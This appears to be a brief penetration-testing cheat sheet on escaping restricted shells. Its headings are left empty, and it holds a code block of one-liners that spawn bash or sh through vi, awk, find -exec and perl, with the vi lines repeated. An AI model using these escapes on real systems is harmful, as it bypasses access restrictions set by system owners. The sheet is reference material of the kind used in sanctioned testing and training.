# Escape Jailed Shells
Find your way out of shellcatraze 

*You can execute built-in shell commands, as well as the ones in your $PATH*

**Research**
**Enumerate**
**Attack Vectors**
**Editors**
** Related Shell Escape Sequences**
```
vi-->       :!bash
vi-->       :set shell=/bin/bash:shell
vi-->       :!bash
vi-->       :set shell=/bin/bash:shell
awk-->      awk 'BEGIN {system("/bin/bash")}'
find-->     find / -exec /usr/bin/awk 'BEGIN {system("/bin/sh")}' \;
perl-->     perl -e 'exec "/bin/sh";'
```
